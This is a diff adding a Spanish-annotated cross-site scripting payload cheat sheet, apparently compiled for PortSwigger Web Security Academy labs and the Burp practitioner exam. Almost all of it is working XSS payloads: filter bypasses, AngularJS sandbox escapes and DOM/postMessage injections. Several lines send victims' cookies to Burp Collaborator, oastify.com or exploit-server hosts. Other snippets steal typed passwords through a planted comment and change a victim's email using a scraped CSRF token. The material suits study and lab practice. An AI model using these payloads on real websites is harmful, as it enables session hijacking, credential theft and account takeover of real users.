@@ -1,0 +1,103 @@
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+?loquesea=javascript:alert(1) --> este siempre va en un campo o valor
+<img src=2 onerror=alert(1)>
+/><script>alert(1)</script>
+</script><script>alert(1)</script>
+"onload=alert(1)>
+"onfocus="alert(1)"autofocus="
+<><img src=2 onerror=alert(1)>  
+"onmouseover="alert(1) --> cuando esté dentro de value y en el response cierrre adecuadamente los ""
+{{$on.constructor('alert(1)')()}}   --> si el documento es procesado por ng-app
+{{$on.constructor('document.location=`http://<BURP-COLLABORATOR-URL>/?cookies=`+document.cookie')()}}
+\"-alert(1)}// --> si los resultados del search=sexo se reflejan en un JSON
+'-alert(1)//
+\'-alert(1)//
+'-alert(1)-'//
+"+alert(document.['cookie'])}//
+"-alert`1`-"//
+"-alert`1`-"
+'+alert(1)+'
+';alert(1);'
+${alert(1)}
+"};alert(1);//
+eval("\u0061lert(1)")
+<SCRIPT>alert(“Te vulnero”)</SCRIPT>
+<script>{onerror=alert}throw 1337</script>
+<script>onerror=alert;throw 1337</script>
+<script>document.location='https://lb.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';</script> --> probar primero sin #x en el search
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+<svg><animatetransform onbegin=alert(1) attributeName=transform> --> después de meterlo al intruder y saber qué events y tags están habilitados
+accesskey="X" onclick="alert(1)"> --> en el link canonical buscando en el código fuente
+</script><script>alert(1)</script>//
+\';alert(1)//
+product?productId=1&storeId=1</option></select><img src=2 onerror=alert(1)> --> si que en la url puedo añadir con storeId=&tak& , cerrar las etiquetas que corresponden en ese html
+&#60;img src=x onload=alert(1)&#62;
+https://loquesea?&apos;-alert(1)-&apos; --> potencial payload si hay interacción oast desde BurpScanner
+<iframe src="https://lab.net/?search=%3Cbody%20onresize=print()%3E%22" onload=this.style.width='100px'></iframe> --> si acepta este artributo
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+/-/-/-/-/PROBAR a la hora de mandar alert a la víctima/-/-/-/-/-/-/
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+<script>document.location=''</script>
+<script>location=''</script>
+<iframe src=""></iframe>
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+/-/-/ RECIBIR COOKIES DE LA VíCTIMA /-/-/
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+en el body del epxploit server
+fetch('https://exploit-0a5800b504dde22cdcb5a7be011d009d.exploit-server.net/?cookies=' + encodeURIComponent(document.cookie));
+
+
+
+<script> fetch('https://COLLABORATOR', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script> --> robar cookie si alguien visita un blog poner en comments
+^ robar cookie si alguien visita un blog poner en comments ^
+
+
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://Collaborator',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">  
+^ robar password en comment ^
+
+<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') };</script>
+^ Cambiar el correo en comments ^
+
+<script>document.location="https://0a5200d30326a446810b6cdf00530032.web-security-academy.net/?SearchTerm=%22-eval(atob('fetch('https://EXPLOIT.server/?c='+document.cookie)'<--EN BASE64 las comillas no))-%22436280";</script>
+depende de los delimitadores %22- es igual a "- para escapar el alert, tendremos que poner lo mismo cuando se averigue que alert es
+
+"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
+{{constructor.constructor('document.location="http://burp.oastify.com/?c="+document.cookie')()}}
+\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
+"fetch('http://burp.oastify.com?c='+btoa(document['cookie']))}//
+fetch('https://exploit-0a5800b504dde22cdcb5a7be011d009d.exploit-server.net/?cookies=' + encodeURIComponent(document.cookie));
+<><img src=1 onerror="window.location='http://burp.oastify.com/?c='+document.cookie">
+<script>document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</script>
+
+xss,test,:alert(1)}//
+xss,test:alert(window["document"]["cookie"])}//
+<script>
+location='https://aca01f631ed8e412c0ac5838007c000a.web-security-academy.net/?query=burpdomxss","test":(window["document"]["location"]="https://exploit-acca1f631e76e4b5c03258a3018f0020%2eweb-security-academy%2enet/?"+window["document"]["cookie"])}//';
+</script>
+
+Buscar document cookie bypass
+- https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/
+- https://github.com/DingyShark/BurpSuiteCertifiedPractitioner
+buscar ctrl + f para enviar la cookie la server
+
+
+
+
+DOM xss
+
+http://lab-id.net/post?postid=5&url=https://exploit-server  --> inyectamos en URL y da 200
+<iframe src="https://0a6d00bc032d7d1380d617c500c3000f.web-security-academy.net/product?productId=3&'><script>print()</script>" onload="if(!window.x)this.src='https://0a6d00bc032d7d1380d617c500c3000f.web-security-academy.net';window.x=1;"></iframe> --> cuando podamos manipular cookies
+<iframe src="https://0a80002a032eba8781f7212500a9003f.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe> --> en el DOM hay vulnerabilidad de mensaje
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe> --> el DOM acepta mensajes con la cadena http 
+<iframe src="https://0a5e00e5035b09d28077716b00b000e6.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'></iframe> --> el DOM se procesa con JSON
+
+
+<iframe src="https://0a5e00e5035b09d28077716b00b000e6.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:window.location=%22https://exploit-0aff00fd04f393a58befba1601db00b1.exploit-server.net/?c=%22%2bbtoa(document.cookie)\"}","*")'></iframe>
